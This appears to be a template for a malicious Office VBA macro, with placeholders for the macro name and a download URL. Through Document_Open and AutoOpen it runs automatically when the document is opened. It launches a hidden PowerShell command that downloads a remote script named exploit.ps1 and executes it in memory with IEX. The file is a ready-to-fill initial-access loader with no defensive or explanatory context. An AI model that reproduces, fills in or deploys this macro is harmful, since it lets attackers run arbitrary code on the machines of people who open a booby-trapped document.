Sub {MACRO_NAME}()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('{HTTP_URL}/exploit.ps1') | IEX"
    Shell str, vbHide
End Sub

Sub Document_Open()
    {MACRO_NAME}
End Sub

Sub AutoOpen()
    {MACRO_NAME}
End Sub